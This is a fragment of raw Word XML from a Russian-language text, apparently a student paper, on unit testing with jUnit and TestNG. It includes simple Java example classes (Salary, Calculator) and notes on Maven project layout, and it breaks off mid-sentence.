          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Unit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D"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PHP код могут тестировать с помощью </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>PHPUnit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> модуля.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D" w:rsidRDefault="0014003D" w:rsidP="0014003D">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Pr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>jUnit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> применяется для модульного тестирования, которое позволяет проверять на правильность отдельные модули исходного кода программы. Преимущество данного подхода заключается в изолировании отдельно взятого модуля от других. При этом, цель такого метода позволяет программисту удостовериться, что модуль, сам по себе, способен работать корректно. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>jUnit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> представляет из себя библиотеку классов. Для демонстрации основных возможностей этой библиотеки, можно написать примитивный класс:</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public</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> class Salary {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private</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> value;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private</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> String type;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14003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>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public</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Salary(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> v, String t){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value</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> = v;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type</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> = t;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14003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>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public</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Salary add(Salary s){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return</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> new Salary(value + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>s.getValue</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">(), type);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14003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>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public</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>getValue</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>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return</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> value;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rPr>
      </w:pPr>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>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rPr>
      </w:pPr>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="252525"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRDefault="0014003D" w:rsidP="0014003D">
      <w:pPr>
        <w:pStyle w:val="a3"/>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p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D" w:rsidRDefault="0014003D" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="708"/>
          <w:tab w:val="left" w:pos="2325"/>
        </w:tabs>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:jc w:val="both"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc10727431"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">1.8 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>TestNG</w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="0014003D" w:rsidRPr="0014003D" w:rsidRDefault="0060216E" w:rsidP="0014003D">
      <w:pPr>
        <w:pStyle w:val="a3"/>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14003D" w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">В качестве </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0014003D" w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>обьяснения</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0014003D" w:rsidRPr="0014003D">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="252525"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> приведу пример работы:</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Простейший тест.</w:t>
      </w:r>
      <w:r w:rsidR="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>До того, как мы начнем, давайте подумаем над тем, а что же собственно мы будем проверять? Предлагается далеко не ходить и написать небольшой класс, который будет в конструкторе получать 2 числа и будет иметь метод </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>getResult</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>) , возвращающий нам произведение этих 2-х чисел. Простенько и со вкусом.</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Код будет выглядеть примерно вот так:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="0060216E" w:rsidRDefault="00073DDF" w:rsidP="0060216E">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>public</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> class Calculator {</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    private </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xml:space="preserve"> first;</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    private </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xml:space="preserve"> second;</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    public Calculator(</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first, </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second) {</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>this.first</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t> = first;</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>this.second</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t> = second;</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    public </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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>getResult</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(){</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">      return first * second;</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">         }</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
        <w:t>}</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Положим его туда, где по правилам </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>maven'а</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> должны лежать исходники, над которыми производятся тесты - папку </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>main</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Разумеется, это правило не строгое, так как тесты могут производиться над любым сторонним модулем, находящимся в принципе в другом проекте. Но если мы пишем тесты на работу локально созданного класса, то и находиться он должен в определенном месте.</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Так как Ваш проект был настроен на использование </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>maven</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, то Вам придется следовать некоторым правилами структуризации кода, установленными </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>maven'ом</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
